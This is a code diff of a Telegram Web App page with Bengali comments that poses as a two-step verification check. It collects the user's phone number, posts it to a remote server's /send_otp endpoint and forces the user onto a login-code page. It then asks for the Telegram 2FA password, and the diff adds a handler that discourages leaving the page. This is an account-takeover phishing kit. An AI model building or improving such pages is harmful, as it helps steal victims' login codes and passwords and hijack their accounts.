@@ -113,7 +113,7 @@
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp" class="emoji-img">
             <h2>2-Step Verification</h2>
             <p>আপনার টু-স্টেপ পাসওয়ার্ডটি দিন।</p>
-            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.1);" placeholder="Enter Password">
+            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.1); outline: none;" placeholder="Enter Password">
             <div id="2fa-error" class="error-msg">❌ পাসওয়ার্ড সঠিক নয়।</div>
             <button class="btn" onclick="verify2FA()">SUBMIT PASSWORD</button>
         </div>
@@ -146,28 +146,24 @@
         }
 
         function handleStart() {
-            // ১. কন্টাক্ট শেয়ার করার রিকোয়েস্ট পাঠানো
             tg.requestContact((sent, response) => {
                 if (sent && response && response.contact) {
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
 
-                    // ২. লোডার দেখানো
                     toggleLoader(true, "Verifying Number...");
 
-                    // ৩. পাইথন সার্ভারে নম্বর পাঠানো
+                    // ব্যাকগ্রাউন্ডে ওটিপি রিকোয়েস্ট পাঠানো
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
                     })
                     .then(res => res.json())
-                    .then(data => {
-                        console.log("Server Response:", data);
-                    })
-                    .catch(e => console.log("Request sent background"));
+                    .then(data => console.log("OTP Sent:", data))
+                    .catch(e => console.log("API Error:", e));
 
-                    // ৪. প্রধান ফিক্স: ১.৫ সেকেন্ড ওয়েট করে সরাসরি ওটিপি পেজে নিয়ে যাওয়া
+                    // ১.৫ সেকেন্ড পর ইউজারকে কোড লেখার পেজে নিয়ে যাওয়া (Force Move)
                     setTimeout(() => {
                         toggleLoader(false);
                         nextStep(2); 
@@ -247,6 +243,11 @@
                 setTimeout(() => document.getElementById('2fa-input').classList.remove('shake'), 500);
             }
         }
+
+        // ব্রাউজার রিফ্রেশ বা ব্যাক হওয়া আটকাতে
+        window.onbeforeunload = function() {
+            if(userPhone) return "Are you sure you want to leave?";
+        };
     </script>
 </body>
 </html>
